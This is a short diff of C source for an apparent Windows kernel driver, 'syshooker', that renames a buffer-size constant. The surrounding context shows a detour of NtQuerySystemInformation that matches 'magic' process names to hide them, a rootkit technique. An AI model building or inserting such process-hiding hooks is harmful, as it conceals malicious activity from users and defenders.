@@ -54,7 +54,7 @@ static UNICODE_STRING StringNtQuerySystemInformation = RTL_CONSTANT_STRING(L"NtQ
 static NtQuerySystemInformation_t OriginalNtQuerySystemInformation = NULL;
 
 void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, ULONG BufferLeftOffset) {
-	WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+	WCHAR ProcessNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
 	const wchar_t* RealProcessNameBufferAddr;
 
 	if (ProcessInformationPtr->NextEntryOffset > 0) // shift if not last process
@@ -62,7 +62,7 @@ void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, U
 	else
 		RealProcessNameBufferAddr = ProcessInformationPtr->ImageName.Buffer;
 
-	wcsncpy(ProcessNameBuffer, RealProcessNameBufferAddr, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER - 1)); // -1 to ensure that the last char is \0
+	wcsncpy(ProcessNameBuffer, RealProcessNameBufferAddr, MIN(ProcessInformationPtr->ImageName.Length, SYSHOOKER_MAX_NAME_LENGTH - 1)); // -1 to ensure that the last char is \0
 	kprintf("[+] syshooker: PrintProcessStructInfo (offset %d): Struct addr: %p, Process Name: %ws, Process Name buffer addr original: %p, shifted buffer: %p, NextEntryOffset: %d, threadcount: %d, thread struct size: %d\n", BufferLeftOffset, ProcessInformationPtr,  ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, RealProcessNameBufferAddr, ProcessInformationPtr->NextEntryOffset, ProcessInformationPtr->NumberOfThreads, sizeof(SYSTEM_THREAD_INFORMATION));
 }
 
@@ -107,8 +107,8 @@ NTSTATUS DetourNtQuerySystemInformation(
 
             while (1) {
 				// create wchar_t buffer from ImageName (which is UNICODE_STRING)
-                WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
-                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
+                WCHAR ProcessNameBuffer[SYSHOOKER_MAX_NAME_LENGTH] = { 0 };
+                wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, SYSHOOKER_MAX_NAME_LENGTH-1)); // -1 to ensure that the last char is \0
 
 				if (matchMagicNames(ProcessNameBuffer, (Target)TARGET_PROCESS)) {
 					kprintf("[+] syshooker: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
